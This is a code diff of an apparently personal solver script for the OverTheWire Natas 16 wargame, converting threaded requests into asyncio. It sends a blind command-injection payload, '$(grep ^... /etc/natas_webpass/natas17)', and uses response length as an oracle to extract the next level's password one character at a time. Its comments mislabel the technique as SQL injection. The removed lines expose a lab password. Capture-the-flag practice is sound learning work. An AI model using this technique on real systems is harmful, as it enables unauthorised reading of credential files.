@@ -1,52 +1,73 @@
-import requests
 import string
-import threading
+import aiohttp
+import asyncio
+from halo import Halo
 
 
-def main():
-    # Credentials
+async def get_password_request(session, data, character):
     url = "http://natas16.natas.labs.overthewire.org/"
-    username = "natas16"
-    natas16_pwd = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V" # <- Change This!
+    async with session.post(url, data=data) as response:
+
+        return await response.text(), character
+
+
+async def get_password(session):
+    spinner = Halo(text='The password for natas 17 is: ',
+                   spinner='bouncingBar', color="blue")
+    spinner.start()
 
     characters = string.ascii_letters + string.digits
-
-    # Session
-    session = requests.Session()
-    session.auth = (username, natas16_pwd)
-
-    natas17_pwd = []
-    threads = []
-
-    def test_password(character, password):
-        # Payload
-        data = {"needle": f"$(grep ^{password + character} /etc/natas_webpass/natas17)"}
-
-        r = session.post(url, data=data)
-
-        # If response is empty that means our grep is correct
-        if len(r.text) != 461926:
-            natas17_pwd.append(character)
+    natas17_password = ""
 
     for _ in range(32):
-        password = "".join(natas17_pwd)
-        print(password)
+        tasks = []
 
-        # For every character it creates a thread that make a request to the webpage
         for character in characters:
-            t = threading.Thread(target=test_password, args=(character, password))
-            threads.append(t)
+            # If "African" is in the HTML body it means the SQLinjection was not succesfull
+            payload = f"African$(grep ^{natas17_password + character} /etc/natas_webpass/natas17)"
+            data = {"needle": payload}
+            tasks.append(asyncio.ensure_future(get_password_request(session, data, character)))
 
-        for x in threads:
-            x.start()
+        requests = await asyncio.gather(*tasks)
+        for response in requests:
+            """
+            The get_password_request return the HTML of the request and the character for the SQLinjection,
+            it keeps the html in response[0] and the character in response[1].
+            """
+            if len(response[0]) != 1122:
+                natas17_password += response[1]
+                spinner.stop()
+                spinner = Halo(text='The password for natas 17 is: ' + natas17_password,
+                            spinner='bouncingBar', color="blue")
+                spinner.start()
+    spinner.succeed(text="The password for natas 17 is: " + natas17_password)
 
-        for x in threads:
-            x.join()
-        threads = []
+    return natas17_password
 
-    natas17_pwd = "".join(natas17_pwd)
-    print(natas17_pwd)
+
+async def make_session(natas16_password):
+    """
+    Create a session and start running an asynchronous function
+    that exploits the SQLinjection in natas 16.
+    """
+    auth = aiohttp.BasicAuth("natas16", natas16_password)
+    async with aiohttp.ClientSession(auth=auth) as session:
+        natas17_password = await get_password(session)
+
+    return natas17_password
+
+
+def get_natas17_password(natas16_password):
+    """
+    Create an event loop and run an asynchronous function.
+    """
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    natas17_password = asyncio.run(make_session(natas16_password))
+
+    return natas17_password
 
 
 if __name__ == "__main__":
-    main()
+    natas16_password = ""  # Put here the password for natas16 here
+    get_natas17_password(natas16_password)
